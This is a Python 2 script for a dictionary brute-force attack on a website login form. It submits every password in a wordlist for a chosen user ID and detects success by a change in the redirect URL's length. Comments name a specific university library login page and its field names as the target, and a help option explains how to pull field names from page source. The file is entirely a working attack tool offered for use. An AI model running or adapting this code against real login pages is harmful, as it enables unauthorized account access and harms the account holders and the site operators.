#-*- coding: utf-8 -*-
import urllib, urllib2, time
from threading import Thread

def siteCracking(loginURL, idValue, pwValue, confirmLength, loginID, dicfp, savefp):
    try:
        passwords=dicfp.readlines()
        for password in passwords:
            print password
            password=password.strip()
            values={ idValue : loginID, pwValue : password }
            data=urllib.urlencode(values)
            request=urllib2.Request(loginURL, data)
            response=urllib2.urlopen(request)
            myString=response.geturl()
            #print myString
            #print response.read()
            length=len(myString)
            if length is not confirmLength:
                savefp.write(password)
                print "\n[+] ID : "+loginID
                print "[+] Password : "+password
                print "[+] Open the Save File"
                return
    except Exception, e:
        print "[-] ", e 
        savefp("[-] "+str(e))
        pass
        
def findLength(loginURL, idValue, pwValue, loginID):
    for i in range(0, 20):
        tmp="0"
        values={ idValue : loginID, pwValue : tmp }
        data=urllib.urlencode(values)
        request=urllib2.Request(loginURL, data)
        response=urllib2.urlopen(request)
        myString=response.geturl()
        print myString
        length=len(myString)
        print "Confirm Length : "+str(length)

def main():
    try:
        loginURL=raw_input("Input Login URL : ") # http://hnulib.hknu.ac.kr/HKUL/Login/LoginPrss.csp
        idValue=raw_input("Input Value ID : ") # UsrID
        pwValue=raw_input("Input Value PW : ") # PWord
        loginID=raw_input("Input Login ID : ")
        while(1):
            print "\n1. SiteCracking\n2. FindLength\n3. Help"
            sel=raw_input("Select(1,2,3) : ")
            if(sel=="1"):
                confirmLen=raw_input("Input Confirm Length : ") # 49
                confirmLength=int(confirmLen)
                dictionary=raw_input("Input Dictionary File : ")
                dicfp=open(dictionary, "r")
                saveFile=raw_input("Input Save File : ")
                savefp=open(saveFile, "w")
                siteCracking(loginURL, idValue, pwValue, confirmLength, loginID, dicfp, savefp)
                #t=Thread(target=siteCracking, args=(loginURL, idValue, pwValue, confirmLength, loginID, dicfp, savefp))
                #t.start()
                dicfp.close()
                savefp.close()
                time.sleep(30)
                exit(0)
            elif(sel=="2"):
                findLength(loginURL, idValue, pwValue, loginID)
            elif(sel=="3"):
                print 'Login URL : Webpage Source - <form action="xxxx"'
                print 'Value ID : Webpage Source - <Input name="xxxx"'
                print 'Value PW : Webpage Source - <Input name="xxxx"'
            else:
                print "[-] Choose from 1, 2, 3"
    except Exception, e:
        print "[-] ", e
        time.sleep(30)
        exit(0)
         
if __name__ == '__main__':
    main()